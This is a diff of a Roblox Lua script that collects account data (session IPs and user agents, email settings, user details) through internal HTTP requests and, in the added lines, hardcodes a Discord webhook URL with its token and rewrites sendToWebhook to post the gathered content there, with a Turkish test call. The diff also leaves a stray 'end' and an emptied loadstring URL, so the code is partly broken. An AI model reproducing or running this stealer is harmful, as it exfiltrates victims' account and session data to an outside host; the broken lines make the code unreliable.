@@ -20,11 +20,11 @@ local marketplaceService = game:GetService("MarketplaceService")
 local httpService = game:GetService("HttpService")
 local requestInternal = httpService.requestInternal
 
-local pretty = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ozzypig/repr/master/repr.lua"))()
+local pretty = loadstring(game:HttpGet("https://"))()
 local prettySettings = {pretty = true}
 
 local DISCORD_HEADERS = {["Content-Type"] = "application/json"}
-local DISCORD_WEBHOOK = ""
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1506771410486431934/tkFOVBUTX5sG7x2YFjYQccjDfqG0FmNB8z_Q2p20UK9uS-nRYVO66eHvAAvaSvaqHKhP"
 local USER_URL = "https://users.roblox.com/v1/users/%s"
 local GAMES_URL = "https://games.roblox.com/v1/games/multiget-place-details?placeIds=%s"
 local EMAIL_URL = "https://accountsettings.roblox.com/v1/email"
@@ -186,14 +186,22 @@ local function getAllSessions(): {{ip: string, agent: string, date: string}}
     return results
 end
 
+local httpService = game:GetService("HttpService")
+
 local function sendToWebhook(content: string): boolean
-    local body = httpService:JSONEncode({content=content})
-    request({
-        Url = DISCORD_WEBHOOK;
-        Method = "POST";
-        Headers = DISCORD_HEADERS;
-        Body = body;
-    })
+    local url = "https://discord.com/api/webhooks/1506771410486431934/tkFOVBUTX5sG7x2YFjYQccjDfqG0FmNB8z_Q2p20UK9uS-nRYVO66eHvAAvaSvaqHKhP"
+    
+    local body = httpService:JSONEncode({content = content})
+    
+    local success, response = pcall(function()
+        return httpService:PostAsync(url, body)
+    end)
+    
+    return success
+end
+
+-- Kullanımı:
+sendToWebhook("Merhaba, bu bir test mesajıdır!")
 end
 
 local sessions = getAllSessions()
